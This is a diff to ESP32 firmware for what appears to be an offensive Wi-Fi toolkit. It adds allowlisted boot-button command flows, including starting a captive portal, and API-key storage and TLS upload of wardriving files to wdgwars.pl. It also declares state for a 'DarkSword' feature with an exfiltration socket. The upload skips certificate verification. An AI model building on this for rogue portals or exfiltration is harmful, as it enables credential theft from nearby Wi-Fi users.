@@ -112,7 +112,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.5.7"
+#define JANOS_VERSION "1.5.9"
 
 #define OTA_GITHUB_OWNER "C5Lab"
 #define OTA_GITHUB_REPO "projectZero"
@@ -138,6 +138,12 @@
 #define WIGLE_NVS_KEY_TOKEN "api_token"
 #define WIGLE_URL           "https://api.wigle.net/api/v2/file/upload"
 #define WIGLE_KEY_MAX_LEN   65
+
+// WDGWars cloud upload
+#define WDGWARS_NVS_NAMESPACE "wdgwars"
+#define WDGWARS_NVS_KEY       "api_key"
+#define WDGWARS_URL           "https://wdgwars.pl/api/upload-csv"
+#define WDGWARS_KEY_MAX_LEN   65
 
 #define DISPLAY_NVS_NAMESPACE "display"
 #define DISPLAY_NVS_KEY_MODE  "mode"
@@ -271,6 +277,7 @@ static volatile int wifi_connect_result = 0;
 static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
 static char wigle_api_name[WIGLE_KEY_MAX_LEN] = "";
 static char wigle_api_token[WIGLE_KEY_MAX_LEN] = "";
+static char wdgwars_api_key[WDGWARS_KEY_MAX_LEN] = "";
 
 // ARP ban state
 static volatile bool arp_ban_active = false;
@@ -511,6 +518,15 @@ static volatile bool karma_mode_active = false;
 static volatile bool rogueap_mode_active = false;
 static TaskHandle_t dns_server_task_handle = NULL;
 static int dns_server_socket = -1;
+
+// DarkSword state
+static volatile bool darksword_active = false;
+static TaskHandle_t darksword_exfil_task_handle = NULL;
+static int darksword_exfil_socket = -1;
+static char *darksword_html = NULL;
+static size_t darksword_html_len = 0;
+static bool darksword_html_gzipped = false;
+
 static TaskHandle_t boot_button_task_handle = NULL;
 static TaskHandle_t boot_action_task_handle = NULL;
 
@@ -1231,7 +1247,7 @@ static bool init_psram_buffers(void)
 #define BOOTCFG_KEY_LONG_CMD   "long_cmd"
 #define BOOTCFG_KEY_SHORT_EN   "short_en"
 #define BOOTCFG_KEY_LONG_EN    "long_en"
-#define BOOTCFG_CMD_MAX_LEN    32
+#define BOOTCFG_CMD_MAX_LEN    192
 
 typedef struct {
     char command[BOOTCFG_CMD_MAX_LEN];
@@ -1246,9 +1262,18 @@ static const char* boot_allowed_commands[] = {
     "scan_networks",
     "start_gps_raw",
     "start_wardrive",
-    "deauth_detector"
+    "deauth_detector",
+    "list_sd",
+    "select_html",
+    "start_portal"
 };
 static const size_t boot_allowed_command_count = sizeof(boot_allowed_commands) / sizeof(boot_allowed_commands[0]);
+
+typedef enum {
+    BOOT_FLOW_VALID = 0,
+    BOOT_FLOW_INVALID_COMMAND,
+    BOOT_FLOW_MALFORMED
+} boot_flow_validation_result_t;
 
 typedef struct {
     bool enabled;
@@ -1335,6 +1360,8 @@ static int cmd_wpasec_key(int argc, char **argv);
 static int cmd_wpasec_upload(int argc, char **argv);
 static int cmd_wigle_key(int argc, char **argv);
 static int cmd_wigle_upload(int argc, char **argv);
+static int cmd_wdgwars_key(int argc, char **argv);
+static int cmd_wdgwars_upload(int argc, char **argv);
 static int cmd_channel_time(int argc, char **argv);
 static int cmd_ota_check(int argc, char **argv);
 static int cmd_ota_list(int argc, char **argv);
@@ -2585,6 +2612,36 @@ static bool wigle_save_key_to_nvs(const char *api_name, const char *api_token) {
     return err == ESP_OK;
 }
 
+static void wdgwars_load_key_from_nvs(void) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WDGWARS_NVS_NAMESPACE, NVS_READONLY, &handle);
+    if (err != ESP_OK) {
+        return;
+    }
+
+    size_t len = sizeof(wdgwars_api_key);
+    err = nvs_get_str(handle, WDGWARS_NVS_KEY, wdgwars_api_key, &len);
+    if (err != ESP_OK) {
+        wdgwars_api_key[0] = '\0';
+    }
+    nvs_close(handle);
+}
+
+static bool wdgwars_save_key_to_nvs(const char *key) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WDGWARS_NVS_NAMESPACE, NVS_READWRITE, &handle);
+    if (err != ESP_OK) {
+        return false;
+    }
+
+    err = nvs_set_str(handle, WDGWARS_NVS_KEY, key);
+    if (err == ESP_OK) {
+        err = nvs_commit(handle);
+    }
+    nvs_close(handle);
+    return err == ESP_OK;
+}
+
 // ---------------------------------------------------
 
 static void ota_mark_valid_if_pending(void) {
@@ -3357,6 +3414,220 @@ static bool boot_is_command_allowed(const char* command) {
     return false;
 }
 
+typedef bool (*boot_flow_visitor_t)(char *command_line, void *ctx);
+
+static char* boot_trim_whitespace(char *text) {
+    if (text == NULL) {
+        return NULL;
+    }
+
+    while (*text && isspace((unsigned char)*text)) {
+        text++;
+    }
+
+    char *end = text + strlen(text);
+    while (end > text && isspace((unsigned char)end[-1])) {
+        *--end = '\0';
+    }
+
+    return text;
+}
+
+static bool boot_buffer_append_char(char *dest, size_t dest_size, size_t *pos, char ch) {
+    if (dest == NULL || pos == NULL || *pos + 1 >= dest_size) {
+        return false;
+    }
+
+    dest[*pos] = ch;
+    (*pos)++;
+    dest[*pos] = '\0';
+    return true;
+}
+
+static bool boot_buffer_append_text(char *dest, size_t dest_size, size_t *pos, const char *text) {
+    if (dest == NULL || pos == NULL || text == NULL) {
+        return false;
+    }
+
+    size_t len = strlen(text);
+    if (*pos + len >= dest_size) {
+        return false;
+    }
+
+    memcpy(dest + *pos, text, len);
+    *pos += len;
+    dest[*pos] = '\0';
+    return true;
+}
+
+static bool boot_append_serialized_arg(char *dest, size_t dest_size, size_t *pos, const char *arg) {
+    if (arg == NULL) {
+        arg = "";
+    }
+
+    bool needs_quotes = (arg[0] == '\0');
+    for (const char *p = arg; *p != '\0'; ++p) {
+        if (isspace((unsigned char)*p) || *p == '"' || *p == '\\') {
+            needs_quotes = true;
+            break;
+        }
+    }
+
+    if (!needs_quotes) {
+        return boot_buffer_append_text(dest, dest_size, pos, arg);
+    }
+
+    if (!boot_buffer_append_char(dest, dest_size, pos, '"')) {
+        return false;
+    }
+
+    for (const char *p = arg; *p != '\0'; ++p) {
+        if (*p == '"' || *p == '\\') {
+            if (!boot_buffer_append_char(dest, dest_size, pos, '\\')) {
+                return false;
+            }
+        }
+        if (!boot_buffer_append_char(dest, dest_size, pos, *p)) {
+            return false;
+        }
+    }
+
+    return boot_buffer_append_char(dest, dest_size, pos, '"');
+}
+
+static bool boot_build_command_flow_from_argv(int argc, char **argv, int start_index, char *dest, size_t dest_size) {
+    if (dest == NULL || dest_size == 0 || argc <= start_index || argv == NULL) {
+        return false;
+    }
+
+    dest[0] = '\0';
+
+    if ((argc - start_index) == 1) {
+        return strlcpy(dest, argv[start_index], dest_size) < dest_size;
+    }
+
+    size_t pos = 0;
+    for (int i = start_index; i < argc; ++i) {
+        if (argv[i] == NULL) {
+            continue;
+        }
+        if (pos > 0 && !boot_buffer_append_char(dest, dest_size, &pos, ' ')) {
+            return false;
+        }
+        if (!boot_append_serialized_arg(dest, dest_size, &pos, argv[i])) {
+            return false;
+        }
+    }
+
+    return pos > 0;
+}
+
+static bool boot_visit_command_flow(char *flow, boot_flow_visitor_t visitor, void *ctx) {
+    if (flow == NULL || visitor == NULL) {
+        return false;
+    }
+
+    char *segment_start = flow;
+    bool in_single_quote = false;
+    bool in_double_quote = false;
+    bool escape_next = false;
+    bool saw_command = false;
+
+    for (char *cursor = flow; ; ++cursor) {
+        char ch = *cursor;
+
+        if (escape_next) {
+            escape_next = false;
+        } else if (ch == '\\' && in_double_quote) {
+            escape_next = true;
+        } else if (ch == '"' && !in_single_quote) {
+            in_double_quote = !in_double_quote;
+        } else if (ch == '\'' && !in_double_quote) {
+            in_single_quote = !in_single_quote;
+        }
+
+        bool at_end = (ch == '\0');
+        bool at_separator = (ch == ',' && !in_single_quote && !in_double_quote);
+
+        if (at_end && (in_single_quote || in_double_quote || escape_next)) {
+            return false;
+        }
+
+        if (!at_separator && !at_end) {
+            continue;
+        }
+
+        *cursor = '\0';
+        char *segment = boot_trim_whitespace(segment_start);
+        if (segment == NULL || segment[0] == '\0') {
+            return false;
+        }
+
+        saw_command = true;
+        if (!visitor(segment, ctx)) {
+            return false;
+        }
+
+        if (at_end) {
+            break;
+        }
+
+        segment_start = cursor + 1;
+    }
+
+    return saw_command;
+}
+
+typedef struct {
+    char invalid_command[BOOTCFG_CMD_MAX_LEN];
+} boot_flow_validation_ctx_t;
+
+static bool boot_validate_command_segment(char *command_line, void *ctx) {
+    boot_flow_validation_ctx_t *validation = (boot_flow_validation_ctx_t *)ctx;
+    char *argv_local[16];
+    size_t argc = esp_console_split_argv(command_line, argv_local, sizeof(argv_local) / sizeof(argv_local[0]));
+    if (argc == 0) {
+        return false;
+    }
+
+    if (!boot_is_command_allowed(argv_local[0])) {
+        if (validation != NULL) {
+            strlcpy(validation->invalid_command, argv_local[0], sizeof(validation->invalid_command));
+        }
+        return false;
+    }
+
+    return true;
+}
+
+static boot_flow_validation_result_t boot_validate_command_flow(const char *flow,
+                                                               char *detail,
+                                                               size_t detail_size) {
+    if (detail != NULL && detail_size > 0) {
+        detail[0] = '\0';
+    }
+
+    if (flow == NULL || flow[0] == '\0') {
+        return BOOT_FLOW_MALFORMED;
+    }
+
+    char flow_copy[BOOTCFG_CMD_MAX_LEN];
+    if (strlcpy(flow_copy, flow, sizeof(flow_copy)) >= sizeof(flow_copy)) {
+        return BOOT_FLOW_MALFORMED;
+    }
+
+    boot_flow_validation_ctx_t validation = {0};
+    if (!boot_visit_command_flow(flow_copy, boot_validate_command_segment, &validation)) {
+        if (detail != NULL && detail_size > 0 && validation.invalid_command[0] != '\0') {
+            strlcpy(detail, validation.invalid_command, detail_size);
+            return BOOT_FLOW_INVALID_COMMAND;
+        }
+        return BOOT_FLOW_MALFORMED;
+    }
+
+    return BOOT_FLOW_VALID;
+}
+
 static void boot_config_set_defaults(void) {
     memset(&boot_config, 0, sizeof(boot_config));
     boot_config.short_press.enabled = false;
@@ -3425,8 +3696,8 @@ static void boot_config_load_from_nvs(void) {
         err = nvs_get_str(handle, BOOTCFG_KEY_SHORT_CMD, boot_config.short_press.command, &required);
         if (err != ESP_OK) {
             ESP_LOGW(TAG, "Boot cfg short cmd read failed: %s", esp_err_to_name(err));
-        } else if (!boot_is_command_allowed(boot_config.short_press.command)) {
-            ESP_LOGW(TAG, "Boot cfg short cmd not allowed (%s), resetting", boot_config.short_press.command);
+        } else if (boot_validate_command_flow(boot_config.short_press.command, NULL, 0) != BOOT_FLOW_VALID) {
+            ESP_LOGW(TAG, "Boot cfg short flow not allowed (%s), resetting", boot_config.short_press.command);
             strlcpy(boot_config.short_press.command, "start_sniffer_dog", sizeof(boot_config.short_press.command));
         }
     }
@@ -3437,8 +3708,8 @@ static void boot_config_load_from_nvs(void) {
         err = nvs_get_str(handle, BOOTCFG_KEY_LONG_CMD, boot_config.long_press.command, &required);
         if (err != ESP_OK) {
             ESP_LOGW(TAG, "Boot cfg long cmd read failed: %s", esp_err_to_name(err));
-        } else if (!boot_is_command_allowed(boot_config.long_press.command)) {
-            ESP_LOGW(TAG, "Boot cfg long cmd not allowed (%s), resetting", boot_config.long_press.command);
+        } else if (boot_validate_command_flow(boot_config.long_press.command, NULL, 0) != BOOT_FLOW_VALID) {
+            ESP_LOGW(TAG, "Boot cfg long flow not allowed (%s), resetting", boot_config.long_press.command);
             strlcpy(boot_config.long_press.command, "start_blackout", sizeof(boot_config.long_press.command));
         }
     }
@@ -3458,43 +3729,87 @@ static void boot_list_allowed_commands(void) {
     for (size_t i = 0; i < boot_allowed_command_count; i++) {
         MY_LOG_INFO(TAG, "  %s", boot_allowed_commands[i]);
     }
+    MY_LOG_INFO(TAG, "Use commas to run a flow, for example:");
+    MY_LOG_INFO(TAG, "  list_sd, select_html 1, start_portal FreeWifi");
+    MY_LOG_INFO(TAG, "Quote arguments that contain spaces:");
+    MY_LOG_INFO(TAG, "  start_portal \"Free Wifi\"");
 }
 
-static void boot_execute_command(const char* command) {
-    if (command == NULL || command[0] == '\0') {
+static bool boot_execute_command_segment(char *command_line, void *ctx) {
+    (void)ctx;
+
+    char parse_copy[BOOTCFG_CMD_MAX_LEN];
+    if (strlcpy(parse_copy, command_line, sizeof(parse_copy)) >= sizeof(parse_copy)) {
+        return false;
+    }
+
+    char *argv_local[16];
+    size_t argc = esp_console_split_argv(parse_copy, argv_local, sizeof(argv_local) / sizeof(argv_local[0]));
+    if (argc == 0) {
+        return false;
+    }
+
+    const char *run_line = command_line;
+    if (strcasecmp(argv_local[0], "packet_monitor") == 0 && argc == 1) {
+        // Keep backward compatibility with the previous fixed channel=1 behavior.
+        run_line = "packet_monitor 1";
+    }
+
+    MY_LOG_INFO(TAG, "Boot cmd: %s", run_line);
+
+    int cmd_ret = 0;
+    esp_err_t err = esp_console_run(run_line, &cmd_ret);
+    if (err == ESP_ERR_NOT_FOUND) {
+        MY_LOG_INFO(TAG, "Boot cmd not found: %s", argv_local[0]);
+        return false;
+    }
+    if (err == ESP_ERR_INVALID_ARG) {
+        MY_LOG_INFO(TAG, "Boot cmd invalid args: %s", run_line);
+        return false;
+    }
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Boot cmd error %s: %s", esp_err_to_name(err), run_line);
+        return false;
+    }
+    if (cmd_ret != 0) {
+        MY_LOG_INFO(TAG, "Boot cmd returned %d: %s", cmd_ret, run_line);
+        return false;
+    }
+
+    return true;
+}
+
+static void boot_execute_command_flow(const char* flow) {
+    if (flow == NULL || flow[0] == '\0') {
         return;
     }
 
-    if (strcasecmp(command, "start_blackout") == 0) {
-        (void)cmd_start_blackout(0, NULL);
-    } else if (strcasecmp(command, "start_sniffer_dog") == 0) {
-        (void)cmd_start_sniffer_dog(0, NULL);
-    } else if (strcasecmp(command, "channel_view") == 0) {
-        (void)cmd_channel_view(0, NULL);
-    } else if (strcasecmp(command, "packet_monitor") == 0) {
-        char arg0[] = "packet_monitor";
-        char arg1[] = "1";
-        char* argv[] = { arg0, arg1, NULL };
-        (void)cmd_packet_monitor(2, argv);
-    } else if (strcasecmp(command, "start_sniffer") == 0) {
-        (void)cmd_start_sniffer(0, NULL);
-    } else if (strcasecmp(command, "scan_networks") == 0) {
-        (void)cmd_scan_networks(0, NULL);
-    } else if (strcasecmp(command, "start_gps_raw") == 0) {
-        (void)cmd_start_gps_raw(0, NULL);
-    } else if (strcasecmp(command, "start_wardrive") == 0) {
-        (void)cmd_start_wardrive(0, NULL);
-    } else if (strcasecmp(command, "deauth_detector") == 0) {
-        (void)cmd_deauth_detector(0, NULL);
-    } else {
-        MY_LOG_INFO(TAG, "Boot cmd '%s' not recognized", command);
+    char flow_copy[BOOTCFG_CMD_MAX_LEN];
+    if (strlcpy(flow_copy, flow, sizeof(flow_copy)) >= sizeof(flow_copy)) {
+        MY_LOG_INFO(TAG, "Boot flow too long, skipping");
+        return;
+    }
+
+    char detail[BOOTCFG_CMD_MAX_LEN];
+    boot_flow_validation_result_t validation = boot_validate_command_flow(flow, detail, sizeof(detail));
+    if (validation == BOOT_FLOW_INVALID_COMMAND) {
+        MY_LOG_INFO(TAG, "Boot flow blocked by command '%s'", detail);
+        return;
+    }
+    if (validation != BOOT_FLOW_VALID) {
+        MY_LOG_INFO(TAG, "Boot flow malformed: %s", flow);
+        return;
+    }
+
+    if (!boot_visit_command_flow(flow_copy, boot_execute_command_segment, NULL)) {
+        MY_LOG_INFO(TAG, "Boot flow stopped: %s", flow);
     }
 }
 
 static void boot_action_task(void *arg) {
     boot_action_params_t *params = (boot_action_params_t *)arg;
     if (params != NULL) {
-        boot_execute_command(params->command);
+        boot_execute_command_flow(params->command);
         free(params);
     }
     boot_action_task_handle = NULL;
@@ -3508,8 +3823,14 @@ static void boot_handle_action(bool is_long_press) {
         MY_LOG_INFO(TAG, "Boot %s action disabled", label);
         return;
     }
-    if (!boot_is_command_allowed(action->command)) {
-        MY_LOG_INFO(TAG, "Boot %s command '%s' not allowed", label, action->command);
+    char detail[BOOTCFG_CMD_MAX_LEN];
+    boot_flow_validation_result_t validation = boot_validate_command_flow(action->command, detail, sizeof(detail));
+    if (validation == BOOT_FLOW_INVALID_COMMAND) {
+        MY_LOG_INFO(TAG, "Boot %s command '%s' not allowed", label, detail);
+        return;
+    }
+    if (validation != BOOT_FLOW_VALID) {
+        MY_LOG_INFO(TAG, "Boot %s flow malformed: %s", label, action->command);
         return;
     }
     MY_LOG_INFO(TAG, "Boot %s executing: %s", label, action->command);
@@ -6009,6 +6330,20 @@ static bool wigle_is_upload_candidate(const char *filename) {
     return false;
 }
 
+static bool wdgwars_is_upload_candidate(const char *filename) {
+    if (!filename) {
+        return false;
+    }
+    size_t len = strlen(filename);
+    if (len > 4 && strcasecmp(filename + len - 4, ".log") == 0) {
+        return true;
+    }
+    if (len > 4 && strcasecmp(filename + len - 4, ".csv") == 0) {
+        return true;
+    }
+    return false;
+}
+
 static const char *wigle_basename(const char *path) {
     if (!path) {
         return NULL;
@@ -6033,6 +6368,37 @@ static bool wigle_resolve_upload_target(const char *arg, char *out_path, size_t 
 
     const char *name = wigle_basename(arg);
     if (!name || name[0] == '\0' || !wigle_is_upload_candidate(name)) {
+        return false;
+    }
+
+    if (strchr(arg, '/') || strchr(arg, '\\')) {
+        if (strncmp(arg, "/sdcard/", 8) == 0) {
+            snprintf(out_path, out_path_sz, "%s", arg);
+        } else if (strncmp(arg, "sdcard/", 7) == 0) {
+            snprintf(out_path, out_path_sz, "/%s", arg);
+        } else {
+            return false;
+        }
+    } else {
+        snprintf(out_path, out_path_sz, "/sdcard/lab/wardrives/%s", name);
+    }
+
+    snprintf(out_name, out_name_sz, "%s", name);
+
+    struct stat st;
+    if (stat(out_path, &st) != 0 || !S_ISREG(st.st_mode)) {
+        return false;
+    }
+    return true;
+}
+
+static bool wdgwars_resolve_upload_target(const char *arg, char *out_path, size_t out_path_sz, char *out_name, size_t out_name_sz) {
+    if (!arg || !out_path || !out_name || out_path_sz == 0 || out_name_sz == 0) {
+        return false;
+    }
+
+    const char *name = wigle_basename(arg);
+    if (!name || name[0] == '\0' || !wdgwars_is_upload_candidate(name)) {
         return false;
     }
 
@@ -6771,6 +7137,394 @@ static int cmd_wigle_upload(int argc, char **argv) {
             skipped++;
         } else if (result == 2) {
             MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", current, total_files, entry->d_name, fsize);
+            failed++;
+            auth_failed = true;
+            break;
+        } else {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
+            failed++;
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(400));
+    }
+
+    closedir(dir);
+
+    MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
+    if (auth_failed) {
+        return 1;
+    }
+    return (failed > 0) ? 1 : 0;
+}
+
+/**
+ * @brief Upload a single Wardrive file (.log/.csv) to wdgwars.pl
+ *
+ * @return 0 on success, 1 on duplicate/skipped, 2 on auth error, -1 on error
+ */
+static int wdgwars_upload_file(const char *filepath, const char *filename) {
+    const size_t CHUNK_SIZE = 2048;
+    const size_t HDR_BUF_SZ = 640;
+    const size_t RESP_BUF_SZ = 640;
+    int result = -1;
+    FILE *f = NULL;
+    esp_tls_t *tls = NULL;
+    uint8_t *chunk_buf = NULL;
+    char *http_headers = NULL;
+    char *resp_buf = NULL;
+
+    f = fopen(filepath, "rb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
+        goto cleanup;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+    if (file_size <= 0 || file_size > 16L * 1024L * 1024L) {
+        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
+        goto cleanup;
+    }
+
+    char boundary[40];
+    snprintf(boundary, sizeof(boundary), "----WDGWars%lu", (unsigned long)(esp_timer_get_time() / 1000));
+
+    const char *content_type = "text/csv";
+    size_t name_len = strlen(filename);
+    if (name_len >= 4 && strcasecmp(filename + name_len - 4, ".log") == 0) {
+        content_type = "text/plain";
+    }
+
+    char body_start[256];
+    int start_len = snprintf(body_start, sizeof(body_start),
+                             "--%s\r\n"
+                             "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
+                             "Content-Type: %s\r\n\r\n",
+                             boundary, filename, content_type);
+    if (start_len <= 0 || start_len >= (int)sizeof(body_start)) {
+        MY_LOG_INFO(TAG, "  Failed to build multipart header");
+        goto cleanup;
+    }
+
+    char body_end[64];
+    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
+    if (end_len <= 0 || end_len >= (int)sizeof(body_end)) {
+        MY_LOG_INFO(TAG, "  Failed to build multipart footer");
+        goto cleanup;
+    }
+
+    int64_t body_total_len_64 = (int64_t)start_len + (int64_t)file_size + (int64_t)end_len;
+    if (body_total_len_64 <= 0 || body_total_len_64 > INT_MAX) {
+        MY_LOG_INFO(TAG, "  File too large for HTTP content-length: %ld bytes", file_size);
+        goto cleanup;
+    }
+    int body_total_len = (int)body_total_len_64;
+
+    http_headers = (char *)heap_caps_malloc(HDR_BUF_SZ, MALLOC_CAP_8BIT);
+    resp_buf = (char *)heap_caps_malloc(RESP_BUF_SZ, MALLOC_CAP_8BIT);
+    chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!chunk_buf) {
+        chunk_buf = (uint8_t *)heap_caps_malloc(CHUNK_SIZE, MALLOC_CAP_8BIT);
+    }
+    if (!http_headers || !resp_buf || !chunk_buf) {
+        MY_LOG_INFO(TAG, "  Buffer allocation failed (hdr/resp/chunk)");
+        goto cleanup;
+    }
+
+    int hdr_len = snprintf(http_headers, HDR_BUF_SZ,
+                           "POST /api/upload-csv HTTP/1.1\r\n"
+                           "Host: wdgwars.pl\r\n"
+                           "X-API-Key: %s\r\n"
+                           "Content-Type: multipart/form-data; boundary=%s\r\n"
+                           "Content-Length: %d\r\n"
+                           "User-Agent: projectZero-wdgwars\r\n"
+                           "Connection: close\r\n"
+                           "\r\n",
+                           wdgwars_api_key, boundary, body_total_len);
+    if (hdr_len <= 0 || hdr_len >= (int)HDR_BUF_SZ) {
+        MY_LOG_INFO(TAG, "  Failed to build HTTP headers");
+        goto cleanup;
+    }
+
+    esp_tls_cfg_t tls_cfg = {
+        .crt_bundle_attach = NULL,
+        .timeout_ms = 20000,
+    };
+
+    tls = esp_tls_init();
+    if (!tls) {
+        MY_LOG_INFO(TAG, "  TLS init failed");
+        goto cleanup;
+    }
+
+    int ret = esp_tls_conn_http_new_sync(WDGWARS_URL, &tls_cfg, tls);
+    if (ret < 0) {
+        MY_LOG_INFO(TAG, "  TLS connection failed");
+        goto cleanup;
+    }
+
+    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0 ||
+        wpasec_tls_write_all(tls, body_start, start_len) < 0) {
+        MY_LOG_INFO(TAG, "  Failed to send request headers/body start");
+        goto cleanup;
+    }
+
+    while (1) {
+        size_t bytes_read = fread(chunk_buf, 1, CHUNK_SIZE, f);
+        if (bytes_read > 0) {
+            if (wpasec_tls_write_all(tls, (const char *)chunk_buf, (int)bytes_read) < 0) {
+                MY_LOG_INFO(TAG, "  Failed to send file chunk");
+                goto cleanup;
+            }
+        }
+        if (bytes_read < CHUNK_SIZE) {
+            if (ferror(f)) {
+                MY_LOG_INFO(TAG, "  Read error while streaming file");
+                goto cleanup;
+            }
+            break;
+        }
+    }
+
+    if (wpasec_tls_write_all(tls, body_end, end_len) < 0) {
+        MY_LOG_INFO(TAG, "  Failed to send multipart footer");
+        goto cleanup;
+    }
+
+    memset(resp_buf, 0, RESP_BUF_SZ);
+    int total_read = 0;
+    while (total_read < (int)RESP_BUF_SZ - 1) {
+        ret = esp_tls_conn_read(tls, resp_buf + total_read, RESP_BUF_SZ - 1 - total_read);
+        if (ret <= 0) break;
+        total_read += ret;
+    }
+    resp_buf[total_read] = '\0';
+
+    int status = 0;
+    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
+        const char *sp = strchr(resp_buf, ' ');
+        if (sp) {
+            status = atoi(sp + 1);
+        }
+    }
+
+    bool duplicate = (strstr(resp_buf, "already") != NULL ||
+                      strstr(resp_buf, "Already") != NULL ||
+                      strstr(resp_buf, "duplicate") != NULL ||
+                      strstr(resp_buf, "Duplicate") != NULL);
+
+    if (status == 200 || status == 201 || status == 202) {
+        result = duplicate ? 1 : 0;
+        goto cleanup;
+    }
+
+    if (status == 401 || status == 403) {
+        result = 2;
+        goto cleanup;
+    }
+    if (status == 409) {
+        result = 1;
+        goto cleanup;
+    }
+
+    MY_LOG_INFO(TAG, "  HTTP error %d", status);
+    result = -1;
+
+cleanup:
+    if (f) {
+        fclose(f);
+    }
+    if (tls) {
+        esp_tls_conn_destroy(tls);
+    }
+    if (chunk_buf) {
+        free(chunk_buf);
+    }
+    if (http_headers) {
+        free(http_headers);
+    }
+    if (resp_buf) {
+        free(resp_buf);
+    }
+    return result;
+}
+
+static int cmd_wdgwars_key(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key> | wdgwars_key read");
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "read") == 0) {
+        if (wdgwars_api_key[0] == '\0') {
+            MY_LOG_INFO(TAG, "WDGWars key: not set");
+            MY_LOG_INFO(TAG, "Set via: wdgwars_key set <key>");
+            MY_LOG_INFO(TAG, "Or place the API key in /sdcard/lab/wdgwars.txt and reboot.");
+        } else {
+            MY_LOG_INFO(TAG, "WDGWars key: %.4s****", wdgwars_api_key);
+        }
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "set") == 0) {
+        if (argc < 3) {
+            MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key>");
+            return 0;
+        }
+        const char *key = argv[2];
+        if (strlen(key) == 0 || strlen(key) >= WDGWARS_KEY_MAX_LEN) {
+            MY_LOG_INFO(TAG, "Invalid key length (max %d chars)", WDGWARS_KEY_MAX_LEN - 1);
+            return 1;
+        }
+        if (wdgwars_save_key_to_nvs(key)) {
+            strncpy(wdgwars_api_key, key, sizeof(wdgwars_api_key) - 1);
+            wdgwars_api_key[sizeof(wdgwars_api_key) - 1] = '\0';
+            MY_LOG_INFO(TAG, "WDGWars key saved: %.4s****", wdgwars_api_key);
+        } else {
+            MY_LOG_INFO(TAG, "Failed to save WDGWars key to NVS");
+            return 1;
+        }
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Usage: wdgwars_key set <key> | wdgwars_key read");
+    return 0;
+}
+
+static int cmd_wdgwars_upload(int argc, char **argv) {
+    oled_display_update_full("> WDGWars", "  Sending files", "  wdgwars.pl", "  Uploading...");
+
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "WIFI NOT CONNECTED");
+        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    if (wdgwars_api_key[0] == '\0') {
+        MY_LOG_INFO(TAG, "NO WDGWARS CREDENTIALS");
+        MY_LOG_INFO(TAG, "Use 'wdgwars_key set <key>' or /sdcard/lab/wdgwars.txt");
+        return 1;
+    }
+
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        return 1;
+    }
+
+    int uploaded = 0;
+    int skipped = 0;
+    int failed = 0;
+    bool auth_failed = false;
+
+    if (argc > 1) {
+        int total_files = argc - 1;
+        MY_LOG_INFO(TAG, "Uploading %d selected Wardrive file(s) to wdgwars.pl...", total_files);
+
+        for (int i = 1; i < argc; i++) {
+            const char *arg = argv[i];
+            char filepath[280];
+            char upload_name[128];
+
+            if (!wdgwars_resolve_upload_target(arg, filepath, sizeof(filepath), upload_name, sizeof(upload_name))) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s -> FAILED (invalid/missing file)", i, total_files, arg ? arg : "(null)");
+                failed++;
+                continue;
+            }
+
+            struct stat st;
+            long fsize = 0;
+            if (stat(filepath, &st) == 0) {
+                fsize = (long)st.st_size;
+            }
+
+            int result = wdgwars_upload_file(filepath, upload_name);
+            if (result == 0) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", i, total_files, upload_name, fsize);
+                uploaded++;
+            } else if (result == 1) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped", i, total_files, upload_name, fsize);
+                skipped++;
+            } else if (result == 2) {
+                MY_LOG_INFO(TAG, "WDGWARS AUTH FAILED");
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", i, total_files, upload_name, fsize);
+                failed++;
+                auth_failed = true;
+                break;
+            } else {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", i, total_files, upload_name, fsize);
+                failed++;
+            }
+
+            vTaskDelay(pdMS_TO_TICKS(250));
+        }
+
+        MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
+        if (auth_failed) {
+            return 1;
+        }
+        return (failed > 0) ? 1 : 0;
+    }
+
+    DIR *dir = opendir("/sdcard/lab/wardrives");
+    if (dir == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/wardrives directory");
+        return 1;
+    }
+
+    struct dirent *entry;
+    int total_files = 0;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        if (wdgwars_is_upload_candidate(entry->d_name)) {
+            total_files++;
+        }
+    }
+
+    if (total_files == 0) {
